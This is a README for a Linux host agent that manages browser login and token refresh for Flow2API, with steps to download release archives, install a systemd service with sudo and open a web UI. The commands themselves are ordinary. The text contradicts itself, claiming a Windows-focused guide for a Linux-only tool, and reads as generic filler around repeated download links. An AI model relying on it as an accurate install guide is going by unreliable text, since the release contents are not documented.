# ⚙️ flow2api-host-agent - Host Agent for Flow2API on Linux

[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)

## 📋 About flow2api-host-agent

flow2api-host-agent is a companion service for Flow2API on Linux hosts. It helps manage browser login, keeps your Token updated automatically, and offers a web interface for easy control. It also runs in the background using systemd to ensure it is always active.

This guide focuses on how to download and run the software on a Windows computer.

This agent mainly targets Linux systems but you will prepare everything from Windows before moving to the host machine.

Topics related to this project include browser automation (chrome), token management, and remote interface access (noVNC). It is built to work smoothly with systemd on your Linux host.

---

## 🖥️ System Requirements

Before you start, make sure your host machine meets these conditions:

- Runs a supported Linux distribution (Ubuntu, Debian, Fedora, CentOS).
- Has systemd available for managing services.
- Uses Google Chrome or a Chromium-based browser installed on Linux.
- Minimum 1GHz processor, 1GB RAM.
- Network connection to communicate with your Windows PC when needed.

Your Windows computer will only be used to download and prepare files for the Linux host.

---

## 🚀 Getting Started: Download flow2api-host-agent on Windows

To begin, you need to download the installation files on your Windows computer.

[![Download flow2api-host-agent Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yusufii00/flow2api-host-agent/releases)

1. Open your web browser and go to the [flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases).
2. Look for the latest release version. It will usually be at the top of the page.
3. Download the files that say Linux executable or setup. These typically have `.tar.gz` or `.tar.xz` extensions.
4. Save the downloaded file to a known location on your Windows PC, such as the Desktop or Downloads folder.

This page contains all releases, so you get the latest updates, bug fixes, and improvements.

---

## 🗂️ Preparing Files for Transfer to Linux Host

Once the package archive downloads, you will need to move it to the Linux host machine.

1. Find the downloaded archive on your Windows computer.
2. Use a USB drive, shared network folder, or secure copy (scp) software to transfer the archive to the Linux host.
3. Place the archive in the home directory or other folder you have permission for on the Linux host.

If you are not familiar with file transfers:

- Using a USB flash drive is the simplest.
- If your Linux host is on the same local network as your Windows PC, you can use Windows File Sharing or tools like WinSCP.

---

## 🖥️ Installing flow2api-host-agent on Linux Host

This section assumes you have a Linux terminal available where the files were transferred.

1. Open your Linux terminal.
2. Navigate to the directory where you placed the downloaded archive:

```
cd /path/to/downloaded/file
```

Replace `/path/to/downloaded/file` with your actual folder path.

3. Extract the contents using one of the commands below:

If the archive ends with `.tar.gz`:

```
tar -xzf flow2api-host-agent-vX.Y.Z.tar.gz
```

If the archive ends with `.tar.xz`:

```
tar -xJf flow2api-host-agent-vX.Y.Z.tar.xz
```

Replace `flow2api-host-agent-vX.Y.Z.tar.gz` with the actual file name.

4. Enter the extracted folder:

```
cd flow2api-host-agent-vX.Y.Z
```

---

## ⚙️ Configure and Start flow2api-host-agent Service

The agent runs as a service managed by systemd. To configure and start it:

1. Copy the service file to systemd directory (run with sudo):

```
sudo cp flow2api-host-agent.service /etc/systemd/system/
```

2. Reload systemd manager configurations:

```
sudo systemctl daemon-reload
```

3. Enable the service to start automatically on boot:

```
sudo systemctl enable flow2api-host-agent
```

4. Start the service now:

```
sudo systemctl start flow2api-host-agent
```

5. Check the service status to ensure it runs without errors:

```
sudo systemctl status flow2api-host-agent
```

Look for `active (running)` in the output.

---

## 🔐 Browser Login and Token Management

The agent uses your browser to log in and keeps your token refreshed automatically.

- You can open the Web UI to log in to your account securely.
- Once logged in, the agent uses the token to keep you connected.
- Token refresh happens in the background without needing manual intervention.

Access Web UI by visiting the address your system admin provides. It usually runs on a local network port on the Linux host.

---

## 🔧 Using the Web User Interface (Web UI)

The Web UI helps you:

- Manage your session and token.
- View status information and logs.
- Control agent functions.

To open the Web UI:

1. Open a web browser on your Windows PC.
2. Enter the IP address or hostname of the Linux host followed by the port number. For example:

```
http://192.168.1.10:8080
```

Replace `192.168.1.10` and `8080` with the actual host address and port.

3. Log in if required using credentials set up during installation.

The Web UI offers a simple way to control the agent without command-line interaction.

---

## 🛠️ Troubleshooting Tips

- If the service does not start, check the systemd logs:

```
journalctl -u flow2api-host-agent.service
```

- Make sure your Linux host’s firewall allows Web UI access.
- Confirm you have the right permissions on files and folders.
- Verify Google Chrome or Chromium browser is installed on your Linux host.
- Check your network connection between Windows PC and Linux host.

---

## 🔄 Updating flow2api-host-agent

To update to a newer version:

1. Download the latest release archive on Windows.
2. Transfer it to your Linux host as before.
3. Stop the running service:

```
sudo systemctl stop flow2api-host-agent
```

4. Replace old files with the new extracted content.
5. Restart the service:

```
sudo systemctl start flow2api-host-agent
```

6. Verify the new version runs successfully.

---

For all downloads and updates, use the latest versions from:

[Visit flow2api-host-agent releases page](https://github.com/yusufii00/flow2api-host-agent/releases)